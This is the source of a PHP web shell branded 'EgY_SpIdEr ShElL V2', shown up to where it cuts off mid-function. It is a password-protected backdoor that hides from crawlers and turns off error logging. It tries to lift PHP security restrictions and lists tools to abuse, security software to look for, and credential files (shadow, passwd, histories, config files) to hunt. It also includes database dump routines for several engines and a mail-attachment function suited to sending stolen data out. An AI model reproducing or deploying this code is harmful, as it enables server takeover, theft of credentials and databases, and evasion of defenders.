<?
###########################################
#           EgY_SpIdEr ShElL V2           #
#            EgY_SpIdEr                   #
#          www.egyspider.eu             #
###########################################

//Change User & Password

$tacfgd['uname'] = 'egy_spider';
$tacfgd['pword'] = 'egy_spider';


// Title of page.
$tacfgd['title'] = 'EgY_SpIdEr ShElL';

// Text to appear just above login form.
$tacfgd['helptext'] = 'EgY SpIdEr ShElL';


// Set to true to enable the optional remember-me feature, which stores encrypted login details to 
// allow users to be logged-in automatically on their return. Turn off for a little extra security.
$tacfgd['allowrm'] = true;

// If you have multiple protected pages, and there's more than one username / password combination, 
// you need to group each combination under a distinct rmgroup so that the remember-me feature 
// knows which login details to use.
$tacfgd['rmgroup'] = 'default';

// Set to true if you use your own sessions within your protected page, to stop txtAuth interfering. 
// In this case, you _must_ call session_start() before you require() txtAuth. Logging out will not 
// destroy the session, so that is left up to you.
$tacfgd['ownsessions'] = false;




foreach ($tacfgd as $key => $val) {
  if (!isset($tacfg[$key])) $tacfg[$key] = $val;
}

if (!$tacfg['ownsessions']) {
  session_name('txtauth');
  session_start();
}

// Logout attempt made. Deletes any remember-me cookie as well
if (isset($_GET['logout']) || isset($_POST['logout'])) {
  setcookie('txtauth_'.$rmgroup, '', time()-86400*14);
  if (!$tacfg['ownsessions']) {
    $_SESSION = array();
    session_destroy();
  }
  else $_SESSION['txtauthin'] = false;
}
// Login attempt made
elseif (isset($_POST['login'])) {
  if ($_POST['uname'] == $tacfg['uname'] && $_POST['pword'] == $tacfg['pword']) {
    $_SESSION['txtauthin'] = true;
    if ($_POST['rm']) {
      // Set remember-me cookie for 2 weeks
      setcookie('txtauth_'.$rmgroup, md5($tacfg['uname'].$tacfg['pword']), time()+86400*14);
    }
  }
  else $err = 'Login Faild !';
}
// Remember-me cookie exists
elseif (isset($_COOKIE['txtauth_'.$rmgroup])) {
  if (md5($tacfg['uname'].$tacfg['pword']) == $_COOKIE['txtauth_'.$rmgroup] && $tacfg['allowrm']) {
    $_SESSION['txtauthin'] = true;
  }
  else $err = 'Login Faild !';
}
if (!$_SESSION['txtauthin']) {
@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
?>
<html dir=rtl>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<title><?=$tacfg['title']?></title>

<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #dadada;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #dadada;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #dadada;
}
input {
BORDER-RIGHT:  #00FF00 1 solid;
BORDER-TOP:    #00FF00 1 solid;
BORDER-LEFT:  #00FF00 1 solid;
BORDER-BOTTOM: #00FF00 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #dadada;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #dadada;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #dadada;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';

<body>
<br><br><div style="font-size: 14pt;" align="center"><?=$tacfg['title']?></div>
<hr width="300" size="1" noshade color="#cdcdcd">
<p>
<div align="center" class="grey">
<?=$tacfg['helptext']?>
</div>
<p>
<?
if (isset($_SERVER['REQUEST_URI'])) $action = $_SERVER['REQUEST_URI'];
else $action = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
if (strpos($action, 'logout=1', strpos($action, '?')) !== false) $action = str_replace('logout=1', '', $action);
?>
<form name="txtauth" action="<?=$action?>" method="post">
<div align="center">
<table border="0" cellpadding="4" cellspacing="0" bgcolor="#666666" style="border: 1px double #dedede;" dir="ltr">
<?=(isset($err))?'<tr><td colspan="2" align="center"><font color="red">'.$err.'</font></td></tr>':''?>
<?if (isset($tacfg['uname'])) {?>
<tr><td>User:</td><td><input type="text" name="uname" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?}?>
<tr><td>Password:</td><td><input type="password" name="pword" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?if ($tacfg['allowrm']) {?>
<tr><td align="left"><input type="submit" name="login" value="Login">
</td><td align="right"><input type="checkbox" name="rm" id="rm"><label for="rm"> 
	Remmeber Me?</label></td></tr>
<?} else {?>
<tr><td colspan="2" align="center">
	<input type="submit" name="login" value="Login"></td></tr>
<?}?>
</table>
</div>
</form>

<br><br>
<hr width="300" size="1" noshade color="#cdcdcd">
<div class="smalltxt" align="center">Developed by
	<a href="mailto:egy_spider@hotmail.com">EgY SpIdEr </a>∑ copyright ©  
	 & EgY SpIdEr</div>

</body>
</html>
<?
  // Don't delete this!
  exit();
}
?>
Login As (<font color="#FF0000"><? echo $tacfgd['uname']; ?></font>) <a href="?logout=1">Logout</a></p>
<div align="right">
<?php

if(preg_match("/bot/", $_SERVER[HTTP_USER_AGENT])) {header("HTTP/1.0 404");exit("<h1>Not Found</h1>");}

$language='eng';

$auth = 0;

$name='7d1f6442a9ed59e62f93dcbc2695baa6'; 
$pass='7d1f6442a9ed59e62f93dcbc2695baa6';

//ru_RU, //ru_RU.cp1251, //ru_RU.iso88595, //ru_RU.koi8r, //ru_RU.utf8
@setlocale(LC_ALL,'ru_RU.cp1251');

@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

if(@function_exists('ini_set'))
 {
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('file_uploads',1);
 @ini_set('allow_url_fopen',1);
 }
else
 {
 @ini_alter('error_log',NULL);
 @ini_alter('log_errors',0);
 @ini_alter('file_uploads',1);
 @ini_alter('allow_url_fopen',1);
 }
 
error_reporting(E_ALL);

/* ??? ????? */
$userful = array('gcc',', lcc',', cc',', ld',', php',', perl',', python',', ruby',', make',', tar',', gzip',', bzip',', bzip2',', nc',', locate',', suidperl');
$danger = array(', kav',', nod32',', bdcored',', uvscan',', sav',', drwebd',', clamd',', rkhunter',', chkrootkit',', iptables',', ipfw',', tripwire',', shieldcc',', portsentry',', snort',', ossec',', lidsadm',', tcplodg',', sxid',', logcheck',', logwatch',', sysmask',', zmbscap',', sawmill',', wormscan',', ninja');
$tempdirs = array(@ini_get('session.save_path').'/',@ini_get('upload_tmp_dir').'/','/tmp/','/dev/shm/','/var/tmp/');
$downloaders = array('wget','fetch','lynx','links','curl','get');

/* ??? ?????? ???????? ???? ????? realpath() */
//$chars_rlph = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
//$chars_rlph = "_-.01234567890abcdefghijklnmopqrstuvwxyz"; 
//$chars_rlph = "_-.ABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
//$chars_rlph = "_-.abcdefghijklnmopqrstuvwxyz"; 
//$chars_rlph = "_-.01234567890"; 
$chars_rlph = "abcdefghijklnmopqrstuvwxyz"; 

$presets_rlph = array('index.php','.htaccess','.htpasswd','httpd.conf','vhosts.conf','cfg.php','config.php','config.inc.php','config.default.php','config.inc.php',
'shadow','passwd','.bash_history','.mysql_history','master.passwd','user','admin','password','administrator','phpMyAdmin','security','php.ini','cdrom','root',
'my.cnf','pureftpd.conf','proftpd.conf','ftpd.conf','resolv.conf','login.conf','smb.conf','sysctl.conf','syslog.conf','access.conf','accounting.log','home','htdocs',
'access','auth','error','backup','data','back','sysconfig','phpbb','phpbb2','vbulletin','vbullet','phpnuke','cgi-bin','html','robots.txt','billing');

/******************************************************************************************************/

define("starttime",@getmicrotime());

if((!@function_exists('ini_get')) || (@ini_get('open_basedir')!=NULL) || (@ini_get('safe_mode_include_dir')!=NULL)){$open_basedir=1;} else{$open_basedir=0;};

set_magic_quotes_runtime(0);
@set_time_limit(0);
if(@function_exists('ini_set'))
 {
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 }
else
 {
 @ini_alter('max_execution_time',0);
 @ini_alter('output_buffering',0);
 }
$safe_mode = @ini_get('safe_mode');
#if(@function_exists('ini_get')){$safe_mode = @ini_get('safe_mode');}else{$safe_mode=1;};
$version = '1.42';
if(@version_compare(@phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 $_COOKIE = &$HTTP_COOKIE_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_COOKIE as $k=>$v)
  {
  $_COOKIE[$k] = stripslashes($v);
  } 
 }

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="HELLO!"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<h1>Access Denied</h1>");
   }
}   

if(!isset($_COOKIE['tempdir'],$_COOKIE['select_tempdir'])) {
	$tempdir='./';
	$select_tempdir = '<select name=tempdir><option value="./">./</option>';
	foreach( $tempdirs as $item) {
		if(@is_writable($item)){$select_tempdir .= '<option value="'.$item.'">'.$item.'</option>';$tempdir=$item;}
	}
	$select_tempdir .= '</select>';
}else{
	if(isset($_POST['tempdir'])){$tempdir = $_POST['tempdir'];}else{$tempdir = $_COOKIE['tempdir'];}
	$select_tempdir = $_COOKIE['select_tempdir'];
}

$head = '<!-- EgY_SpIdEr -->
<html>
<head>
<meta http-equiv="Content-Language" content="ar-sa">
<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<title>EgY_SpIdEr ShElL</title>



<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #333333 ;
BORDER-TOP:    #333333 ;
BORDER-LEFT:   #333333 ;
BORDER-BOTTOM: #333333 ;
color: #FFFFFF;
}
td {
BORDER-RIGHT:  #333333 ;
BORDER-TOP:    #333333 ;
BORDER-LEFT:   #333333 ;
BORDER-BOTTOM: #333333 ;
color: #FFFFFF;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #333333;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #333333;
}
input {
BORDER-RIGHT:  #00FF00 1 solid;
BORDER-TOP:    #00FF00 1 solid;
BORDER-LEFT:  #00FF00 1 solid;
BORDER-BOTTOM: #00FF00 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #333333;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #333333;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #333333;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        } 
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    } 
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";            
        $fr   .= "\x00\x00";            
        $fr   .= "\x08\x00";            
        $fr   .= $hexdtime;             
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);             
        $fr      .= pack('V', $c_len);           
        $fr      .= pack('V', $unc_len);         
        $fr      .= pack('v', strlen($name));    
        $fr      .= pack('v', 0);                
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x14\x00";                
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x08\x00";                
        $cdrec .= $hexdtime;                 
        $cdrec .= pack('V', $crc);           
        $cdrec .= pack('V', $c_len);         
        $cdrec .= pack('V', $unc_len);       
        $cdrec .= pack('v', strlen($name) ); 
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('V', 32 );            
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('V', strlen($ctrldir)) .           
            pack('V', strlen($data)) .              
            "\x00\x00";              
    }
}

function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress')) 
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     } 
     else if ($compress == 'gzip' && @function_exists('gzencode')) 
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     } 
     else if ($compress == 'zip' && @function_exists('gzcompress')) 
     {
     $filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     } 
     else 
     {
     $mime_type = 'application/octet-stream';
     }
 }

function moreread($temp){
global $lang,$language;
$str='';
  if(@function_exists('fopen')&&@function_exists('feof')&&@function_exists('fgets')&&@function_exists('feof')&&@function_exists('fclose') && ($ffile = @fopen($temp, "r"))){
   if($ffile){
     while(!@feof($ffile)){$str .= @fgets($ffile);};
     fclose($ffile);
   }
  }elseif(@function_exists('fopen')&&@function_exists('fread')&&@function_exists('fclose')&&@function_exists('filesize')&&($ffile = @fopen($temp, "r"))){
   if($ffile){
     $str = @fread($ffile, @filesize($temp));
     @fclose($ffile);
   }
  }elseif(@function_exists('file')&&($ffiles = @file($temp))){
   foreach ($ffiles as $ffile) { $str .= $ffile; }
  }elseif(@function_exists('file_get_contents')){
   $str = @file_get_contents($temp);
  }elseif(@function_exists('readfile')){
   $str = @readfile($temp);
  }elseif(@function_exists('highlight_file')){
   $str = @highlight_file($temp);
  }elseif(@function_exists('show_source')){
   $str = @show_source($temp);
  }else{echo $lang[$language.'_text56'];}
return $str;
}

function readzlib($filename,$temp=''){
global $lang,$language;
$str='';
  if(!$temp) {$temp=tempnam(@getcwd(), "copytemp");};
  if(@copy("compress.zlib://".$filename, $temp)) {
   $str = moreread($temp);
  } else echo $lang[$language.'_text119'];
  @unlink($temp);
return $str;
}

function morewrite($temp,$str='')
{
global $lang,$language;
 if(@function_exists('fopen') && @function_exists('fwrite') && @function_exists('fclose') && ($ffile=@fopen($temp,"wb"))){
  if($ffile){
   @fwrite($ffile,$str);
   @fclose($ffile);
  }
 }elseif(@function_exists('fopen') && @function_exists('fputs') && @function_exists('fclose') && ($ffile=@fopen($temp,"wb"))){
  if($ffile){
   @fputs($ffile,$str);
   @fclose($ffile);
  }
 }elseif(@function_exists('file_put_contents')){
   @file_put_contents($temp,$str);
 }else return 0;
return 1;
}

function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;        
 var $error;      
 var $rows;       
 var $columns;     
 var $num_rows;   
 var $num_fields; 
 var $dump;       
 
 function connect()
  {   
  switch($this->db)
     {
   case 'MySQL': 
    if(empty($this->port)) { $this->port = '3306'; }
    if(!@function_exists('mysql_connect')) return 0;
    $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
    if(is_resource($this->connection)) return 1;
   break;
   case 'MSSQL':
      if(empty($this->port)) { $this->port = '1433'; }
    if(!@function_exists('mssql_connect')) return 0;
    $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
      if($this->connection) return 1;
   break;
   case 'PostgreSQL':
      if(empty($this->port)) { $this->port = '5432'; }
      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
      if(!@function_exists('pg_connect')) return 0;
      $this->connection = @pg_connect($str);
      if(is_resource($this->connection)) return 1;
   break;
   case 'Oracle':
      if(!@function_exists('ocilogon')) return 0;
      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
      if(is_resource($this->connection)) return 1;
   break;
   case 'MySQLi':
    if(empty($this->port)) { $this->port = '3306'; }
    if(!@function_exists('mysqli_connect')) return 0;
    $this->connection = @mysqli_connect($this->host,$this->user,$this->pass,$this->base,$this->port);
    if(is_resource($this->connection)) return 1;
   break;
   case 'mSQL':
    if(!@function_exists('msql_connect')) return 0;
    $this->connection = @msql_connect($this->host.':'.$this->port,$this->user,$this->pass);
    if(is_resource($this->connection)) return 1;
   break;
   case 'SQLite':
    if(!@function_exists('sqlite_open')) return 0;
    $this->connection = @sqlite_open($this->base);
    if(is_resource($this->connection)) return 1;
   break;
     }
    return 0;   
  }
  
 function select_db()
  {
   switch($this->db)
    {
  case 'MySQL':
   if(@mysql_select_db($this->base,$this->connection)) return 1;
  break;
  case 'MSSQL':
   if(@mssql_select_db($this->base,$this->connection)) return 1;
  break;
  case 'PostgreSQL':
     return 1;
  break;
  case 'Oracle':
     return 1;
  break;
  case 'MySQLi':
     return 1;
  break;
  case 'mSQL':
     if(@msql_select_db($this->base,$this->connection)) return 1;
  break;
  case 'SQLite':
     return 1;
  break;
    }
 return 0;  
  }
  
 function query($query)
  { 
   $this->res=$this->error='';
   switch($this->db)
    {
  case 'MySQL': 
     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))) 
      { 
      $this->error = @mysql_error($this->connection);
      return 0;
      } 
     else if(is_resource($this->res)) { return 1; }                   
     return 2;                                                          
  break;
  case 'MSSQL':
     if(false===($this->res=@mssql_query($query,$this->connection))) 
      {
      $this->error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this->res) > 0) { return 1; }
     return 2;     
  break;
  case 'PostgreSQL':
     if(false===($this->res=@pg_query($this->connection,$query)))
      {
      $this->error = @pg_last_error($this->connection);
      return 0;
      }
      else if(@pg_num_rows($this->res) > 0) { return 1; }
     return 2; 
  break;
  case 'Oracle':
     if(false===($this->res=@ociparse($this->connection,$query)))
      {
      $this->error = 'Query parse error';
      }
     else 
      { 
      if(@ociexecute($this->res)) 
       {
       if(@ocirowcount($this->res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this->error=$error['message']; 
      }
  break;
  case 'MySQLi': 
     if(false===($this->res=@mysqli_query($this->connection,$query))) 
      { 
      $this->error = @mysqli_error($this->connection);
      return 0;
      } 
     else if(is_resource($this->res)) { return 1; }                   
     return 2;                                                          
  break;
  case 'mSQL': 
     if(false===($this->res=@msql_query($query,$this->connection))) 
      { 
      $this->error = @msql_error($this->connection);
      return 0;
      } 
     else if(is_resource($this->res)) { return 1; }                   
     return 2;                                                          
  break;
  case 'SQLite': 
     if(false===($this->res=@sqlite_query($this->connection,$query))) 
      { 
      $this->error = @sqlite_error_string($this->connection);
      return 0;
      } 
     else if(is_resource($this->res)) { return 1; }                   
     return 2;                                                          
  break;
    }
  return 0;
  }
 function get_result()
  { 
   $this->rows=array();
   $this->columns=array();
   $this->num_rows=$this->num_fields=0;
   switch($this->db)
    {
  case 'MySQL':
   $this->num_rows=@mysql_num_rows($this->res);
   $this->num_fields=@mysql_num_fields($this->res);
   while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res))); 
   @mysql_free_result($this->res);
   if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
  break;
  case 'MSSQL':
   $this->num_rows=@mssql_num_rows($this->res);
   $this->num_fields=@mssql_num_fields($this->res);    
   while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
   @mssql_free_result($this->res);
   if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
  break;
  case 'PostgreSQL':
   $this->num_rows=@pg_num_rows($this->res); 
   $this->num_fields=@pg_num_fields($this->res);   
   while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
   @pg_free_result($this->res);
   if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
  break;
  case 'Oracle':
     $this->num_fields=@ocinumcols($this->res);
     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
     @ocifreestatement($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
  break;
  case 'MySQLi':
     $this->num_rows=@mysqli_num_rows($this->res);
     $this->num_fields=@mysqli_num_fields($this->res);
     while(false !== ($this->rows[] = @mysqli_fetch_assoc($this->res))); 
     @mysqli_free_result($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
  break;
  case 'mSQL':
     $this->num_rows=@msql_num_rows($this->res);
     $this->num_fields=@msql_num_fields($this->res);
     while(false !== ($this->rows[] = @msql_fetch_array($this->res))); 
     @msql_free_result($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
  break;
  case 'SQLite':
     $this->num_rows=@sqlite_num_rows($this->res);
     $this->num_fields=@sqlite_num_fields($this->res);
     while(false !== ($this->rows[] = @sqlite_fetch_array($this->res))); 
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
  break;
    }
   return 0; 
  }
 function dump($table)
  { 
   if(empty($table)) return 0;
   $this->dump=array();
   $this->dump[0] = '##';
   $this->dump[1] = '## --------------------------------------- ';
   $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this->dump[3] = '## Database: '.$this->base;
   $this->dump[4] = '##    Table: '.$table;
   $this->dump[5] = '## --------------------------------------- ';
   switch($this->db)
    {
  case 'MySQL':
     $this->dump[0] = '## MySQL dump';
     if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
     if(!$this->get_result()) return 0;
     $this->dump[] = $this->rows[0]['Create Table'];
     $this->dump[] = '## --------------------------------------- ';
     if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}
    $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
  break;
  case 'MSSQL':
     $this->dump[0] = '## MSSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
  break;
  case 'PostgreSQL':
     $this->dump[0] = '## PostgreSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);} 
    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    } 
  break;
  case 'Oracle':
     $this->dump[0] = '## ORACLE dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {     
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
  break;
  case 'MySQLi':
     $this->dump[0] = '## MySQLi dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {     
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysqli_real_escape_string($v);}
    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
  break;
  case 'mSQL':
     $this->dump[0] = '## mSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {     
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
